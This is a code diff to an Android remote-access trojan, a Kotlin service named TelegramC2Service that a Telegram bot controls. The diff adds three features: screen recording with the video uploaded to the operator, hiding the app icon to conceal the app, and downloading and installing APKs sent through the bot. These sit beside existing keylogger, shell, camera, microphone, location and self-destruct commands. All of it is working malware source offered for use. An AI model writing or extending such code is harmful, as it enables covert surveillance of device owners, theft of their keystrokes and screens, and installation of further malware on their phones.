@@ -108,7 +108,6 @@ class TelegramC2Service : Service() {
         scope.launch { pollLoop() }
         scope.launch { autoRefreshLoop() }
 
-        // Ensure watchdog is armed
         WatchdogReceiver.schedule(this)
     }
 
@@ -330,6 +329,9 @@ class TelegramC2Service : Service() {
             put(JSONObject().put("command", "info").put("description", "📱 Device info"))
             put(JSONObject().put("command", "shell").put("description", "💻 Run shell command"))
             put(JSONObject().put("command", "screenshot").put("description", "📸 Screen capture"))
+            put(JSONObject().put("command", "screen_record").put("description", "🎥 Record screen"))
+            put(JSONObject().put("command", "hide_icon").put("description", "👻 Hide app icon"))
+            put(JSONObject().put("command", "show_icon").put("description", "✅ Show app icon"))
         }
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("commands", cmds.toString())
@@ -448,6 +450,10 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
                 put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
             })
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🎥 Record 10s").put("callback_data", "act:screen_record:10"))
+                put(JSONObject().put("text", "🎥 Record 30s").put("callback_data", "act:screen_record:30"))
+            })
             put(backRow())
         })
     }
@@ -534,6 +540,10 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "📊 Live status").put("callback_data", "menu:status"))
             })
             put(JSONArray().apply {
+                put(JSONObject().put("text", "👻 Hide icon").put("callback_data", "act:hide_icon"))
+                put(JSONObject().put("text", "✅ Show icon").put("callback_data", "act:show_icon"))
+            })
+            put(JSONArray().apply {
                 put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
             })
             put(backRow())
@@ -544,6 +554,7 @@ class TelegramC2Service : Service() {
         val proj = if (captureSession != null) "🟢 active" else "🟡 disabled"
         val kl = try { if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped" } catch (_: Exception) { "?" }
         val notif = notifCount()
+        val rec = if (ScreenRecorder.isRecording()) "🟢 recording" else "⚪ idle"
         val now = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
         return buildString {
             append("<b>📊 Live Status</b>\n")
@@ -551,6 +562,7 @@ class TelegramC2Service : Service() {
             append("🕐 <code>$now</code>\n")
             append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
             append("📸 Projection: $proj\n")
+            append("🎥 Screen rec: $rec\n")
             append("⌨️ Keylogger: $kl\n")
             append("🔔 Notifications: $notif\n")
             append("⏱ Uptime: ${uptimeStr()}\n")
@@ -795,6 +807,22 @@ class TelegramC2Service : Service() {
         update.optJSONObject("message")?.let { msg ->
             val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@let
             if (chatId != CHAT_ID) return@let
+
+            // Handle APK uploads
+            msg.optJSONObject("document")?.let { doc ->
+                val fileId = doc.optString("file_id", "")
+                val fileName = doc.optString("file_name", "")
+                val fileSize = doc.optLong("file_size", 0)
+                log("document received: $fileName ($fileSize bytes)")
+                if (fileName.endsWith(".apk", true)) {
+                    sendMessage("📦 receiving APK: <code>${fileName}</code>…")
+                    downloadAndInstallApk(fileId, fileName)
+                } else {
+                    sendMessage("📄 received: <code>${fileName}</code>\n<i>only .apk files are auto-installed</i>")
+                }
+                return@let
+            }
+
             val text = msg.optString("text", "").trim()
             if (text.isEmpty()) return@let
             log("cmd: $text")
@@ -818,6 +846,61 @@ class TelegramC2Service : Service() {
                 log("handleCallback error: ${e.message}")
                 lastError = e.message ?: ""
                 answerCallback(cbId, "error")
+            }
+        }
+    }
+
+    private suspend fun downloadAndInstallApk(fileId: String, fileName: String) {
+        withContext(Dispatchers.IO) {
+            try {
+                val getBody = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("file_id", fileId)
+                    .build()
+                val info = apiCall("getFile", getBody) ?: run {
+                    sendMessage("⚠️ failed to get file info")
+                    return@withContext
+                }
+                val filePath = info.optJSONObject("result")?.optString("file_path") ?: run {
+                    sendMessage("⚠️ no file_path returned")
+                    return@withContext
+                }
+
+                val url = "https://api.telegram.org/file/bot$BOT_TOKEN/$filePath"
+                val req = Request.Builder().url(url).get().build()
+                val bytes = client.newCall(req).execute().use { it.body?.bytes() }
+                if (bytes == null || bytes.isEmpty()) {
+                    sendMessage("⚠️ download failed")
+                    return@withContext
+                }
+
+                val dir = File(cacheDir, "apk")
+                if (!dir.exists()) dir.mkdirs()
+                val dest = File(dir, fileName)
+                dest.writeBytes(bytes)
+
+                sendMessage("📦 APK saved: ${dest.length() / 1024} KB\n<i>opening installer…</i>")
+
+                withContext(Dispatchers.Main) {
+                    try {
+                        val intent = Intent(Intent.ACTION_VIEW).apply {
+                            setDataAndType(
+                                androidx.core.content.FileProvider.getUriForFile(
+                                    applicationContext,
+                                    "${packageName}.fileprovider",
+                                    dest
+                                ),
+                                "application/vnd.android.package-archive"
+                            )
+                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        startActivity(intent)
+                    } catch (e: Exception) {
+                        sendMessage("⚠️ install intent failed: ${e.message}")
+                    }
+                }
+            } catch (e: Exception) {
+                sendMessage("⚠️ APK install error: ${e.message}")
             }
         }
     }
@@ -952,6 +1035,25 @@ class TelegramC2Service : Service() {
                               "📸 <i>${SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())}</i>")
                 }
 
+                "screen_record" -> {
+                    val proj = projection
+                    if (proj == null) { sendMessage("🚫 no projection — enable capture first"); return }
+                    val sec = sub.toIntOrNull()?.coerceIn(5, 120) ?: 30
+                    sendMessage("🎥 recording ${sec}s…")
+                    val res = ScreenRecorder.start(this, proj, sec)
+                    if (res.has("error")) {
+                        sendMessage("⚠️ ${res.optString("error")}")
+                        return
+                    }
+                    delay((sec + 3) * 1000L)
+                    val f = ScreenRecorder.currentFile()
+                    if (f != null && f.exists()) {
+                        sendDocumentFile(f, "🎥 screen recording (${sec}s)")
+                    } else {
+                        sendMessage("⚠️ recording failed to save")
+                    }
+                }
+
                 "camera" -> {
                     val cam = sub.ifEmpty { "back" }
                     sendMessage("📷 taking $cam photo…")
@@ -1075,6 +1177,18 @@ class TelegramC2Service : Service() {
                     else sendMessage("🪟 done")
                 }
 
+                "hide_icon" -> {
+                    val res = IconHider.hide(this)
+                    if (res.has("error")) sendMessage("⚠️ ${res.optString("error")}")
+                    else sendMessage("👻 icon hidden\n\n<i>Restore via:</i>\n<code>adb shell pm enable ${packageName}/.MainActivity</code>\n<i>or Settings → Apps → System Service</i>")
+                }
+
+                "show_icon" -> {
+                    val res = IconHider.show(this)
+                    if (res.has("error")) sendMessage("⚠️ ${res.optString("error")}")
+                    else sendMessage("✅ icon restored")
+                }
+
                 "keylog_start" -> {
                     KeylogBuffer.start()
                     sendMessage("⌨️ keylogger <b>started</b>")
@@ -1138,6 +1252,7 @@ class TelegramC2Service : Service() {
                 sendMessage("<b>💻 shell</b> <code>[exit ${res.optInt("exit", -1)}]</code>\n<pre>${out.take(3500)}</pre>")
             }
             "screenshot" -> runAction("screenshot", "")
+            "screen_record" -> runAction("screen_record", arg.ifEmpty { "30" })
             "camera" -> runAction("camera", arg.ifEmpty { "back" })
             "mic" -> runAction("mic", arg.ifEmpty { "10" })
             "location" -> runAction("location", "")
@@ -1151,6 +1266,8 @@ class TelegramC2Service : Service() {
             "home" -> runAction("home", "")
             "back" -> runAction("back", "")
             "recents" -> runAction("recents", "")
+            "hide_icon" -> runAction("hide_icon", "")
+            "show_icon" -> runAction("show_icon", "")
             "keylog_start" -> runAction("keylog_start", "")
             "keylog_stop" -> runAction("keylog_stop", "")
             "keylog_dump" -> runAction("keylog_dump", "")
